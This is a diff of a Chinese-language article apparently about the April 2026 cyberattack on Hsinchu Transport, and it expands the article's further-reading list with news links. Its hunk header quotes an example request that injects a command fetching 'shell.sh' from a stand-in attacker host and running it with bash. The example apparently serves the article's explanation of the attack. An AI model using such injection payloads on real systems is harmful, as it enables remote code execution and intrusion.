@@ -88,6 +88,16 @@ GET /track?id=1234;curl http://attacker.com/shell.sh|bash
 
 ## 七、延伸閱讀
 
-- [iThome 資安週報 0420–0424](https://www.ithome.com.tw/news/175284)
-- [新竹物流遭駭大停擺（TechNews）](https://infosecu.technews.tw/2026/04/20/hct-hacker/)
-- [NIST CVE-2026-39808](https://nvd.nist.gov/)
+### 新竹物流事件新聞報導
+
+- [新竹物流遭駭大停擺，物流關鍵基礎設施成資安破口（TechNews 科技新報）](https://infosecu.technews.tw/2026/04/20/hct-hacker/)
+- [新竹物流驚傳遭駭！癱瘓 2 天還沒好（Newtalk 新聞）](https://newtalk.tw/news/view/2026-04-18/1030469)
+- [「新竹物流」遭網路攻擊，北市刑大證實接獲報案（Newtalk 新聞）](https://newtalk.tw/news/view/2026-04-20/1030757)
+- [新竹物流傳遭駭客攻擊，今赴北市刑大報案（聯合新聞網）](https://udn.com/news/story/7320/9452432)
+- [新竹物流遭網攻報案，北市刑大偵辦中（大紀元）](https://www.epochtimes.com/b5/26/4/20/n14745751.htm)
+- [物流中斷的資安壓力測試：零日攻擊下的營運韌性（CIO Taiwan）](https://www.cio.com.tw/110866/)
+
+### 資安週報與背景資料
+
+- [iThome 資安週報 0420–0424：漏洞五年暴增 263%，NIST 轉向風險優先策略](https://www.ithome.com.tw/news/175284)
+- [NIST NVD](https://nvd.nist.gov/)
